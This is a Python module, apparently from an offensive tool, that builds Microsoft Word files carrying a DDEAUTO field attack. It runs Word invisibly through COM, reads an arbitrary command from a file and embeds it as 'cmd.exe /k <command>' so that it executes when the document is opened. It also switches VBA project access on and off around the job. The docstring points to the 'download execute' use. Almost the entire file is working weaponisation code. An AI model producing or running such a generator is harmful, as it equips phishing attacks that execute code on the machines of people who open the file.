#!/usr/bin/env python
# encoding: utf-8

# Only enabled on windows
import sys
if sys.platform == "win32":
    # Download and install pywin32 from https://sourceforge.net/projects/pywin32/files/pywin32/
    import win32com.client # @UnresolvedImport

import logging
from modules.word_gen import WordGenerator


class WordDDE(WordGenerator):
    """ 
    Module used to generate MS Word file with DDE object attack
    Inspired by: https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
    ex: download execute file:
    """
         
    
    def run(self):
        logging.info(" [+] Generating MS Word with DDE document...")
        
        self.enableVbom()

        logging.info("   [-] Open document...")
        # open up an instance of Word with the win32com driver
        word = win32com.client.Dispatch("Word.Application")
        # do the operation in background without actually opening Excel
        word.Visible = False
        document = word.Documents.Add()

        logging.info("   [-] Save Document...")
        wdFormatXMLDocument = 12
        wdFormatDocument = 0
        if self.word97FilePath is not None:
            document.SaveAs(self.word97FilePath, FileFormat=wdFormatDocument)
        if self.wordFilePath is not None:
            document.SaveAs(self.wordFilePath, FileFormat=wdFormatXMLDocument)

        logging.info("   [-] Inject DDE field...")
        # Read command file
        commandFile =self.getCMDFile()    
        with open (commandFile, "r") as f:
            command=f.read()
            
        ddeCmd = r'c:\\windows\\system32\\cmd.exe "/k %s"' % command.rstrip()
        wdFieldDDEAuto=46
        document.Fields.Add(Range=word.Selection.Range,Type=wdFieldDDEAuto, Text=ddeCmd, PreserveFormatting=False)
        
        # save the document and close
        word.DisplayAlerts=False
        document.Save()
        document.Close()
        word.Application.Quit()
        # garbage collection
        del word
        
        self.disableVbom()
        
        if self.word97FilePath is not None:
            logging.info("   [-] Generated Word file path: %s" % self.word97FilePath)
        
        if self.wordFilePath is not None:
            logging.info("   [-] Generated Word file path: %s" % self.wordFilePath)
         
        
        